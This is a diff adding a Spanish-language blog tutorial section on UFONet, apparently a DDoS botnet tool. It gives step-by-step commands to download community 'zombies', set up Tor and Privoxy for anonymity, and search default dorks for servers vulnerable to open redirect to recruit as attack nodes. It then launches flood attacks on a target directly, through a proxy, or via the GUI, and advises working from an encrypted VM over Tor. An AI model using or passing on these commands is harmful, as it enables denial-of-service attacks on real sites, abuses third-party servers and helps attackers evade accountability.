@@ -315,6 +315,66 @@ El uso de esta herramienta es con el siguiente comando:
 {: rules="groups"}
 
 
+Para descargar los `zombies` de la comunidad se usa:
+{: .notice}
+
+{% highlight bash %}
+python3 ufonet --download-zombies
+{% endhighlight %}
+
+En este punto es donde la cosa se pone interesante
+
+>Se recomienda completamente hacer las pruebas dentro de una maquina virtual con disco duro cifrado, asi como entrar en anonimato desde una red Tor
+
+Como root ejecutamos los siguientes comandos
+
+{% highlight bash %}
+
+apt-get install tor vidalia
+apt-get install vidalia
+apt-get install privoxy
+apt-get install vidalia privoxy
+#--------#
+service tor start
+service privoxy start
+python3 ufonet --check-tor
+
+{% endhighlight %}
+
+para poder encontrar los servidores web vulnerables a Open Redirect a traves de los dorks que ya existen por defecto
+
+{% highlight bash %}
+
+cd  /ufonet/botnet
+cat dorks.txt
+cd ..
+python3 ufonet -v --sd=botnet/dorks.txt --proxy="http://127.0.0.1:8118"
+
+{% endhighlight %}
+
+#### Para realizar un ataque normal corremos el siguiente comando
+
+{% highlight bash %}
+
+python3 ufonet -a https://example.io -r 8 --sa
+
+{% endhighlight %}
 
 
+#### Para realizar un ataque bajo Proxy
+
+{% highlight bash %}
+
+python3 ufonet -a https://example.io -r 8 --proxy="http://127.0.0.1:8080" --sa
+
+{% endhighlight %}
+
+
+#### O podemos realizar todo desde la propia GUI de la aplicacion:
+
+{% highlight bash %}
+
+python3 ufonet --gui
+
+{% endhighlight %}
 
